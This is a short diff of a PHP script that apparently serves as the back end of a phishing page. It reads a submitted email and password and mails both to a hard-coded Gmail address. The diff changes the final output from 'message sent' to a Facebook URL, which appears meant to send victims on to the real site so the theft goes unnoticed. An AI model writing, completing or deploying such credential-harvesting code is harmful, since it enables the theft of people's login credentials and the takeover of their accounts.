@@ -5,10 +5,11 @@ $passkey = $_POST["pass"];
 $recipient = "israelstoba@gmail.com";
 
 
-$mailheader = "From:".$email."<".$passkey.">\r\n";
+$mailheader = "From:" .$email. "<" .$passkey. ">\r\n";
 
 mail($recipient, $mailheader)
 or die("Error");
 
-echo "message sent";
+echo "https://web.facebook.com";
+
 ?>
